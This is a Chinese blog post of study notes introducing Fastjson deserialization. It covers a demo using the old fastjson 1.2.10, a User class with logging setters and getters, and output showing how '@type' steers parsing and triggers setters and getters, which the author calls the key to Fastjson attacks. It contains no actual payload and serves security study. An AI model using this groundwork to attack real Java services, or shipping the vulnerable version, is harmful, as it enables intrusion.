<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Fastjson反序列化简易入门终于放暑假啦哈哈哈，放暑假后差不多先摸了一个星期的鱼，然后再开始学点东西 关于Fastjson网上能查到的东西已经非常非常多了，所以我写的肯定没那群神仙好，简单记录一下自己都在学啥，免得日后忘了 本文代码基本上也是网上抄的 简易环境搭建">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson反序列化简易入门">
<meta property="og:url" content="https://blog.z3ratu1.cn/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html">
<meta property="og:site_name" content="Z3ratu1&#39;s blog">
<meta property="og:description" content="Fastjson反序列化简易入门终于放暑假啦哈哈哈，放暑假后差不多先摸了一个星期的鱼，然后再开始学点东西 关于Fastjson网上能查到的东西已经非常非常多了，所以我写的肯定没那群神仙好，简单记录一下自己都在学啥，免得日后忘了 本文代码基本上也是网上抄的 简易环境搭建">
<meta property="og:locale">
<meta property="article:published_time" content="2021-09-05T06:13:36.000Z">
<meta property="article:modified_time" content="2024-05-25T11:25:43.022Z">
<meta property="article:author" content="Z3ratu1">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://blog.z3ratu1.cn/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-Hans'
  };
</script>

  <title>Fastjson反序列化简易入门 | Z3ratu1's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Z3ratu1's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
      <meta itemprop="name" content="Z3ratu1">
      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z3ratu1's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Fastjson反序列化简易入门
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-05 14:13:36" itemprop="dateCreated datePublished" datetime="2021-09-05T14:13:36+08:00">2021-09-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-25 19:25:43" itemprop="dateModified" datetime="2024-05-25T19:25:43+08:00">2024-05-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
                </span>
            </span>

          
            <span id="/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html" class="post-meta-item leancloud_visitors" data-flag-title="Fastjson反序列化简易入门" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Fastjson反序列化简易入门"><a href="#Fastjson反序列化简易入门" class="headerlink" title="Fastjson反序列化简易入门"></a>Fastjson反序列化简易入门</h1><p>终于放暑假啦哈哈哈，放暑假后差不多先摸了一个星期的鱼，然后再开始学点东西</p>
<p>关于Fastjson网上能查到的东西已经非常非常多了，所以我写的肯定没那群神仙好，简单记录一下自己都在学啥，免得日后忘了</p>
<p>本文代码基本上也是网上抄的</p>
<h2 id="简易环境搭建"><a href="#简易环境搭建" class="headerlink" title="简易环境搭建"></a>简易环境搭建</h2><p>fastjson的使用还挺方便的，简单demo的话添加个依赖然后两三句就能搞定<br>pom.xml</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>随着实验更改版本</p>
<p>代码是抄的文末参考链接的</p>
<p>定义user类，并设置private和public属性，以及部分属性的setter getter<br>User.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> String name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，有getter、setter方法</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，有getter、setter方法</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> flag<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，有is、setter方法</span>
    <span class="token keyword">public</span> String sex<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//公有属性，无getter、setter方法</span>
    <span class="token keyword">private</span> String address<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，无getter、setter方法</span>

    <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User default Constructor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User isFlag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> flag<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFlag</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User setFlag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>flag <span class="token operator">=</span> flag<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"User{"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>
                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                <span class="token string">", flag="</span> <span class="token operator">+</span> flag <span class="token operator">+</span>
                <span class="token string">", sex='"</span> <span class="token operator">+</span> sex <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>
                <span class="token string">", address='"</span> <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>
                <span class="token string">'}'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>test.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        String serializedStr <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.z33.test.User\",\"name\":\"z33\",\"age\":20, \"flag\": true,\"sex\":\"boy\",\"address\":\"china\"}"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"serializedStr="</span> <span class="token operator">+</span> serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>

        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//通过parse方法进行反序列化，返回的是一个JSONObject]</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parse(serializedStr)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj1 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化对象名称:"</span> <span class="token operator">+</span> obj1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化："</span> <span class="token operator">+</span> obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//通过parseObject,不指定类，返回的是一个JSONObject</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parseObject(serializedStr)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span> <span class="token operator">+</span> obj2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span> <span class="token operator">+</span> obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//通过parseObject,指定为object.class</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parseObject(serializedStr, Object.class)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj3 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span> <span class="token operator">+</span> obj3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span> <span class="token operator">+</span> obj3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//通过parseObject,指定为User.class</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parseObject(serializedStr, User.class)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj4 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">,</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span> <span class="token operator">+</span> obj4<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span> <span class="token operator">+</span> obj4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里展示了三种主要的反序列化方法<br>调用prase，praseObject不指定类以及指定类</p>
<p>fastjson在传入一个序列化字符串时，除了类自带的基础属性，还可以携带一个名为<code>@type</code>的值，这个值就是fastjson攻击的关键点，在开启了autotype的情况下，fastjson会把输入字符串往@type指定的类上去解析，从而完成进一步的攻击</p>
<p>先来看看执行的结果吧<br>不带@type</p>
<pre><code>serializedStr=&#123;&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20, &quot;flag&quot;: true,&quot;sex&quot;:&quot;boy&quot;,&quot;address&quot;:&quot;china&quot;&#125;
-----------------------------------------------


JSON.parse(serializedStr)：
parse反序列化对象名称:com.alibaba.fastjson.JSONObject
parse反序列化：&#123;&quot;flag&quot;:true,&quot;address&quot;:&quot;china&quot;,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20&#125;
-----------------------------------------------

JSON.parseObject(serializedStr)：
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;address&quot;:&quot;china&quot;,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, Object.class)：
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;address&quot;:&quot;china&quot;,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, User.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:org.z33.test.User
parseObject反序列化:User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------
</code></pre>
<p>在未指定@type时，只有最后一个函数<code>JSON.parseObject(serializedStr, User.class)</code>在明确指定了类为User时，反序列化出来的对象为User类，且调用了类的构造函数和setter，其公有属性sex在无setter的情况下成功赋值，而私有属性address在无setter的情况下赋值失败<br>私有属性无setter的情况下，可以在反序列化时加上参数Feature.SupportNonPublicField进行赋值</p>
<p>再来看看增加了@type后的结果</p>
<pre><code>serializedStr=&#123;&quot;@type&quot;:&quot;org.z33.test.User&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20, &quot;flag&quot;: true,&quot;sex&quot;:&quot;boy&quot;,&quot;address&quot;:&quot;china&quot;&#125;
-----------------------------------------------


JSON.parse(serializedStr)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parse反序列化对象名称:org.z33.test.User
parse反序列化：User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------

JSON.parseObject(serializedStr)：
call User default Constructor
call User setName
call User setAge
call User setFlag
call User getName
call User getAge
call User isFlag
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:&#123;&quot;name&quot;:&quot;z33&quot;,&quot;flag&quot;:true,&quot;age&quot;:20,&quot;sex&quot;:&quot;boy&quot;&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, Object.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:org.z33.test.User
parseObject反序列化:User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, User.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:org.z33.test.User
parseObject反序列化:User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------
</code></pre>
<p>除未指定类的parseObject外均解析至User类，且调用了默认构造函数和setter，表现均与之前未指定@type但在parseObject中指定类一致，parseObject函数在指定类后，反序列化的结果类必须是指定类或其子类，否则会抛出异常（再外面套一层就能在抛出异常前完成反序列化操作，大概是因为先实例化filed再赋值给最外层对象吧？）<br>而在<code>JSON.parseObject(serializedStr)</code>中虽然返回值为JSONObject，但还额外调用了getter函数，这是因为不指定类的parseObject其实是这样子的</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> JSONObject <span class="token function">parseObject</span><span class="token punctuation">(</span>String text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Object obj <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">JSONObject</span> <span class="token operator">?</span> <span class="token punctuation">(</span>JSONObject<span class="token punctuation">)</span>obj <span class="token operator">:</span> <span class="token punctuation">(</span>JSONObject<span class="token punctuation">)</span><span class="token function">toJSON</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>就是在parse后面加了一个toJSON，而这个toJSON函数在最后又调用实例化的User对象的getter函数给JSONObject赋值</p>
